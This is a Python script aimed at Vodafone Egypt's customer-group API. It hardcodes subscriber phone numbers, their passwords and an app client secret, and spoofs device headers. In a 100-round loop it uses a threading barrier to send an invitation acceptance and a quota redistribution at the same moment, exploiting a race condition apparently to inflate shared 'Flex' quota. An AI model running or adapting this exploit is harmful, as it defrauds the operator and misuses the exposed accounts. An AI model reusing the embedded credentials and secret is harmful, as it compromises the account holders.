import sys
import time 
import httpx
import threading
sys.excepthook = lambda *args: None
owner = "01094204741"
password_owner = "Selem@1234##"
#=============================
member1 = "01014767151"
#=============================
member2 = "01018116257"
password_member2 = "Hamo123#"
#=============================
count_loop = 100
#=============================
def countdown(seconds, loop=""):
    for remaining in range(seconds, 0, -1):
        sys.stdout.write("\r" + " " * 50 + "\r")
        sys.stdout.write(f"⏳{loop} Waiting : {remaining} s")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r" + " " * 50 + "\r")
    sys.stdout.flush()

def login(number, password):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Connection': 'keep-alive',
        'silentLogin': 'false',
        'x-dynatrace': 'MT_3_17_3569497752_11-0_a556db1b-4506-43f3-854a-1d2527767923_0_25993_455',
        'x-agent-operatingsystem': '13',
        'clientId': 'AnaVodafoneAndroid',
        'Accept-Language': 'ar',
        'x-agent-device': 'Xiaomi M2101K9AG',
        'x-agent-version': '2025.7.3',
        'x-agent-build': '1068',
        'User-Agent': 'okhttp/4.11.0',
        'Host': 'mobile.vodafone.com.eg',
        'Accept-Encoding': 'gzip',
    }

    data = {
        "username": number,
        "password": password,
        "grant_type": "password",
        "client_secret": "a2ec6fff-0b7f-4aa4-a733-96ceae5c84c3",
        "client_id": "my-vodafone-app"
    }

    try:
        res = httpx.post(
            "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token",
            headers=headers,
            data=data
        )
        
        if res.status_code == 200:
            access_token = res.json().get("access_token")
            print('تم تسجيل الدخول بنجاح ✅')
            return access_token
        else:
            print('فشل تسجيل الدخول: رقم الهاتف أو كلمة المرور غير صحيحة ❌')
            return None
            
    except Exception as e:
        print(f'حدث خطأ أثناء الاتصال: {str(e)}')
        return None
#===============================#
def QuotaRedistribution(access_token, owner, member, quota):
	url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
	headers = {
	    "Host": "mobile.vodafone.com.eg",
	    "User-Agent": "okhttp/4.11.0",
	    "Accept-Encoding": "gzip",
	    "Accept": "application/json",
	    "Connection": "Keep-Alive",
	    "Content-Type": "application/json; charset=UTF-8",
	    "Authorization": "Bearer "+access_token,
	    "api-version": "v2",
	    "x-agent-operatingsystem": "15",
	    "clientId": "AnaVodafoneAndroid",
	    "x-agent-device": "HONOR ELI-NX9",
	    "x-agent-version": "2024.12.1",
	    "x-agent-build": "946",
	    "msisdn": owner,
	    "Accept-Language": "ar"
	}
	data = {
		  "category": [
		    {
		      "listHierarchyId": "TemplateID",
		      "value": "47"
		    }
		  ],
		  "createdBy": {
		    "value": "MobileApp"
		  },
		  "parts": {
		    "characteristicsValue": {
		      "characteristicsValue": [
		        {
		          "characteristicName": "quotaDist1",
		          "type": "percentage",
		          "value": quota
		        }
		      ]
		    },
		    "member": [
		      {
		        "id": [
		          {
		            "schemeName": "MSISDN",
		            "value": owner
		          }
		        ],
		        "type": "Owner"
		      },
		      {
		        "id": [
		          {
		            "schemeName": "MSISDN",
		            "value": member
		          }
		        ],
		        "type": "Member"
		      }
		    ]
		  },
		  "type": "QuotaRedistribution"
	}
	response = httpx.patch(url, headers=headers, json=data)
	if  'limit' in response.text:
		w = response.headers['ratelimit-reset']
		countdown(int(w), 'limit')
	print(f'[+]quota [{member}]| {quota} => {response.text}')
#===============================#
def SendInvitation(access_token, owner, member, quota):
	url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
	headers = {
	    "Host": "web.vodafone.com.eg",
	    "User-Agent": "Mozilla/5.0 (iPhone 15; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/605.1.15",
	    "Accept-Encoding": "gzip, deflate, br, zstd",
	    "Accept": "application/json",
	    "Connection": "keep-alive",
	    "Content-Type": "application/json",
	    "sec-ch-ua-platform": "Android",
	    "Authorization": "Bearer "+access_token,
	    "Accept-Language": "AR",
	    "msisdn": owner,
	    "clientId": "WebsiteConsumer",
	    "Origin": "https://web.vodafone.com.eg",
	    "X-Requested-With": "mark.via.gp"
	}
	data = {
		  "name": "FlexFamily",
		  "type": "SendInvitation",
		  "category": [
		    {
		      "value": 523,
		      "listHierarchyId": "PackageID"
		    },
		    {
		      "value": "47",
		      "listHierarchyId": "TemplateID"
		    },
		    {
		      "value": 523,
		      "listHierarchyId": "TierID"
		    }
		  ],
		  "parts": {
		    "member": [
		      {
		        "id": [
		          {
		            "value": owner,
		            "schemeName": "MSISDN"
		          }
		        ],
		        "type": "Owner"
		      },
		      {
		        "id": [
		          {
		            "value": member,
		            "schemeName": "MSISDN"
		          }
		        ],
		        "type": "Member"
		      }
		    ],
		    "characteristicsValue": {
		      "characteristicsValue": [
		        {
		          "characteristicName": "quotaDist1",
		          "value": quota,
		          "type": "percentage"
		        }
		      ]
		    }
		  }
	}
	response = httpx.post(url, headers=headers, json=data)
	if 'limit' in response.text:
		w = response.headers['ratelimit-reset']
		countdown(int(w), 'limit')
	print(f"[+]send [{member}] {quota} | {response.text}")
#===============================#
def AcceptInvitation(access_token, owner, member):
	url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
	headers = {
	    "Host": "mobile.vodafone.com.eg",
	    "User-Agent": "Mozilla/5.0 (iPhone 14; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/605.1.15",
	    "Accept-Encoding": "gzip",
	    "Accept": "application/json",
	    "Connection": "Keep-Alive",
	    "Content-Type": "application/json; charset=UTF-8",
	    "Authorization": "Bearer "+access_token,
	    "api-version": "v2",
	    "x-agent-operatingsystem": "15",
	    "clientId": "AnaVodafoneAndroid",
	    "x-agent-device": "HONOR ELI-NX9",
	    "x-agent-version": "2024.12.1",
	    "x-agent-build": "946",
	    "msisdn": member,
	    "Accept-Language": "ar"
	}
	payload = {
	    "name": "FlexFamily",
	    "type": "AcceptInvitation",
	    "category": [
	        {"value": "47", "listHierarchyId": "TemplateID"}
	    ],
	    "parts": {
	        "member": [
	            {
	                "id": [{"value": owner, "schemeName": "MSISDN"}],
	                "type": "Owner"
	            },
	            {
	                "id": [{"value": member, "schemeName": "MSISDN"}],
	                "type": "Member"
	            }
	        ]
	    }
	}
	response = httpx.patch(url, headers=headers, json=payload)
	if  'limit' in response.text:
		w = response.headers['ratelimit-reset']
		countdown(int(w), 'limit')
	print(f"[+]Accept [{member}] | {response.text}")
#===============================#
def CancelInvitation(access_token, owner, member):
	url = "https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
	headers = {
	    "Host": "web.vodafone.com.eg",
	    "User-Agent": "Mozilla/5.0 (iPhone 12; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/604.1 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
	    "Accept-Encoding": "gzip",
	    "Accept": "application/json",
	    "Connection": "Keep-Alive",
	    "Content-Type": "application/json; charset=UTF-8",
	    "Authorization": "Bearer "+access_token,
	    "api-version": "v2",
	    "x-agent-operatingsystem": "15",
	    "clientId": "AnaVodafoneAndroid",
	    "x-agent-device": "iPhone 14 Pro Max",
	    "x-agent-version": "2024.11.2",
	    "x-agent-build": "944",
	    "msisdn": owner,
	    "Accept-Language": "ar"
	}
	payload = {
    "category": [
        {"listHierarchyId": "PackageID", "value": 523},
        {"listHierarchyId": "TemplateID", "value": "47"},
        {"listHierarchyId": "TierID", "value": 523}
    ],
    "parts": {
        "characteristicsValue": {
            "characteristicsValue": [
                {"characteristicName": "quotaDist1", "type": "percentage", "value": "40"}
            ]
        },
        "member": [
            {
                "id": [{"schemeName": "MSISDN", "value": owner}],
                "type": "Owner"
            },
            {
                "id": [{"schemeName": "MSISDN", "value": member}],
                "type": "Member"
            }
        ]
    },
    "type": "CancelInvitation"
}

	response = httpx.post(url, headers=headers, json=payload)
	if  'limit' in response.text:
		w = response.headers['ratelimit-reset']
		countdown(int(w), 'limit')
	print(f"[+]Remove [{member}] | {response.text}")
#===============================#
def total_felix(access_token, owner):
	url = f"https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?bucket.product.publicIdentifier={owner}&@type=aggregated"
	headers = {
	    "User-Agent": "okhttp/4.11.0",
	    "Accept-Encoding": "gzip",
	    "Accept": "application/json",
	    "Connection": "Keep-Alive",
	    "channel": "MOBILE",
	    "useCase": "Promo",
	    "Authorization": "Bearer "+access_token,
	    "api-version": "v2",
	    "x-agent-operatingsystem": "11",
	    "clientId": "AnaVodafoneAndroid",
	    "x-agent-device": "OPPO CPH2059",
	    "x-agent-version": "2024.3.3",
	    "x-agent-build": "593",
	    "msisdn": owner,
	    "Content-Type": "application/json",
	    "Accept-Language": "ar",
	    "Host": "web.vodafone.com.eg"
	}
	response = httpx.get(url, headers=headers).json()
	value = None
	for item in response:
	       if item.get("@type") == "OTHERS":
	           for bucket in item.get("bucket", []):
	               if bucket.get("usageType") == "limit":
	               	value = bucket["bucketBalance"][0]["remainingValue"]["amount"]
	               	break
	print(f"Flexat => {value}")
#===============================#
access_owner = login(owner, password_owner)
access_member = login(member2, password_member2)

for x in range(count_loop):
    if x % 2 == 0 and x != 0:
        access_owner = login(owner, password_owner)
        access_member = login(member2, password_member2)
    # end block

    QuotaRedistribution(access_owner, owner, member1, '10')
    countdown(5*60)
    SendInvitation(access_owner, owner, member2, '40')
    time.sleep(15)
    barrier = threading.Barrier(2)

    def fun1():
        barrier.wait()
        AcceptInvitation(access_member, owner, member2)

    def fun2():
        barrier.wait()
        QuotaRedistribution(access_owner, owner, member1, '40')

    t1 = threading.Thread(target=fun1)
    t2 = threading.Thread(target=fun2)

    t1.start()
    t2.start()

    t1.join()
    t2.join()

    time.sleep(15)
    CancelInvitation(access_owner, owner, member2)
    total_felix(access_owner, owner)
    countdown(5*60, loop=f'loop {x + 1} from {count_loop}')
